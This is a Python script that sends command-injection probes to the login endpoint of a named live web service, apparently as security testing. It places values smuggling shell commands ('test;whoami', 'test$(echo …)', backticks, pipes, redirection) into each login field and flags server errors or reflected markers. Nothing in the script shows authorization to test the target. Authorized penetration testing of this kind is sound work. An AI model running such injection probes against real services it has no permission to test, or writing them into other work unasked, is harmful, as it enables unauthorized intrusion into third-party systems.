
import requests
import time
import json

URL = "https://dsapi.thelocal.co.in/dc/api/v1/auth/login"

HEADERS = {
    "Content-Type": "application/json",
    "Accept": "application/json"
}

BASE_PAYLOAD = {
    "email": "securitytest@example.com",
    "password": "InvalidPassword123!",
    "platform": "android",
    "deviceId": "security-test-device"
}

# Non-destructive command-injection input probes.
# These strings are submitted as data; this script does not
# execute operating-system commands.

TEST_CASES = [
    {
        "name": "Semicolon separator",
        "value": "test;echo SECURITY_TEST"
    },
    {
        "name": "Pipe operator",
        "value": "test|echo SECURITY_TEST"
    },
    {
        "name": "Ampersand operator",
        "value": "test&echo SECURITY_TEST"
    },
    {
        "name": "Command substitution syntax",
        "value": "test$(echo SECURITY_TEST)"
    },
    {
        "name": "Backtick syntax",
        "value": "test`echo SECURITY_TEST`"
    },
    {
        "name": "Logical OR operator",
        "value": "test||echo SECURITY_TEST"
    },
    {
        "name": "Logical AND operator",
        "value": "test&&echo SECURITY_TEST"
    },
    {
        "name": "Newline character",
        "value": "test\n echo SECURITY_TEST"
    },
    {
        "name": "Shell redirection",
        "value": "test>security_test.txt"
    },
    {
        "name": "Command separator",
        "value": "test;whoami"
    }
]

FIELDS = ["email", "password", "platform", "deviceId"]

print("=" * 65)
print("DOCSYNAPSE - COMMAND INJECTION SECURITY TESTING")
print("=" * 65)

for field in FIELDS:

    print("\n" + "=" * 65)
    print("TESTING FIELD:", field)
    print("=" * 65)

    for index, test in enumerate(TEST_CASES, 1):

        payload = BASE_PAYLOAD.copy()
        payload[field] = test["value"]

        print(f"\n[{index}/{len(TEST_CASES)}] {test['name']}")
        print("Input:", repr(test["value"]))

        try:
            start = time.time()

            response = requests.post(
                URL,
                json=payload,
                headers=HEADERS,
                timeout=15
            )

            elapsed = round(time.time() - start, 3)

            print("HTTP Status:", response.status_code)
            print("Response Time:", elapsed)

            body = response.text

            print("Response:", body[:300])

            if response.status_code == 429:
                print("RATE LIMIT DETECTED - STOPPING TESTS")
                raise SystemExit

            elif response.status_code >= 500:
                print("WARNING: SERVER ERROR - INVESTIGATION REQUIRED")

            elif response.status_code in (400, 401, 403, 422):
                print("OBSERVATION: Request rejected. Review validation.")

            elif "SECURITY_TEST" in body:
                print("WARNING: TEST MARKER REFLECTED - INVESTIGATE")

            else:
                print("OBSERVATION: Manual verification required")

        except requests.exceptions.RequestException as error:
            print("REQUEST ERROR:", error)
            raise SystemExit

        time.sleep(5)

print("\n" + "=" * 65)
print("COMMAND INJECTION TESTING FINISHED")
print("=" * 65)
